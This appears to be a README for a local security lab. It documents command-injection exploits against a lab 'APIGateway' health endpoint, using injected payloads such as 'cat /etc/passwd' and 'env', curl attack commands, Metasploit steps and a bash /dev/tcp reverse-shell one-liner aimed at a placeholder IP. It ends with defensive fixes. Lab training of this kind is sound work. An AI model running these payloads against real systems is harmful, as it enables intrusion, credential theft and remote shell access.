# APIGateway - Remote Code Execution (RCE) Exploits

## Overview
These exploits target the APIGateway's command injection vulnerability in the health check endpoint.

## Target Application
- **Project**: APIGateway
- **Port**: 5004
- **Vulnerable Endpoint**: `/health`
- **Vulnerability**: OS Command Injection in ping functionality

## Prerequisites
```bash
# Ensure APIGateway is running
docker-compose up -d apigateway
# Verify it's accessible:
curl http://localhost:5004/health
```

## Exploits

### 1. command_injection.py
Python-based command injection exploit.

**Usage:**
```bash
python3 command_injection.py
```

**Customization:**
Edit the script to change the injected command:
```python
# Default command: cat /etc/passwd
payload = {
    'host': '127.0.0.1; cat /etc/passwd'
}

# Change to other commands:
# 'host': '127.0.0.1; whoami'
# 'host': '127.0.0.1; ls -la'
# 'host': '127.0.0.1; env'
```

**What it does:**
- Sends a malicious `host` parameter to `/health` endpoint
- Injects shell commands after the ping command
- Uses semicolon (`;`) to chain commands

**Expected Output:**
```
[+] Targeting: http://localhost:5004/health
[+] Injecting command: cat /etc/passwd
[+] Response:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

### 2. bash_env_exec.rb
Metasploit-based command execution module (Ruby).

**Usage:**
```bash
# Using Metasploit Framework:
msfconsole
msf6 > use multi/http/bash_environment_variable_injection
msf6 > set RHOST localhost
msf6 > set RPORT 5004
msf6 > set TARGETURI /health
msf6 > exploit

# Or run the Ruby module directly:
ruby bash_env_exec.rb
```

**What it does:**
- Exploits bash environment variable injection
- Can establish reverse shell
- More advanced than simple command injection

**Expected Output:**
```
[*] Started reverse TCP handler on 10.0.0.1:4444
[*] Sending exploit...
[*] Command shell session 1 opened
```

## Manual Testing
Test the vulnerability manually:

```bash
# Basic injection
curl "http://localhost:5004/health?host=127.0.0.1;whoami"

# Multi-command injection
curl "http://localhost:5004/health?host=127.0.0.1;id;uname%20-a"

# Reverse shell (replace with your IP)
curl "http://localhost:5004/health?host=127.0.0.1;bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/YOUR_IP/4444%200>%261'"
```

## Defense Recommendations
- **Input Validation**: Whitelist allowed characters (only IP addresses)
- **Parameterization**: Use subprocess with list arguments, not shell=True
- **Sandboxing**: Use subprocess with restricted environment
- **Alternative**: Use Python's `socket` library instead of system ping

**Secure Code Example:**
```python
import subprocess
import re

def safe_ping(host):
    # Validate IP address format
    if not re.match(r'^[\d\.]+$', host):
        return "Invalid IP address"
    
    # Use list arguments (no shell interpretation)
    result = subprocess.run(
        ['ping', '-c', '1', host],
        capture_output=True,
        timeout=5,
        shell=False  # Critical!
    )
    return result.stdout.decode()
```

## Notes
**WARNING**: Command injection can lead to:
- Full container compromise
- Data exfiltration
- Lateral movement to other services
- Container escape (see `../docker_escape/`)

## Related Exploits
- See `../ssrf/` for SSRF attacks on internal services
- See `../docker_escape/` for container escape after gaining RCE
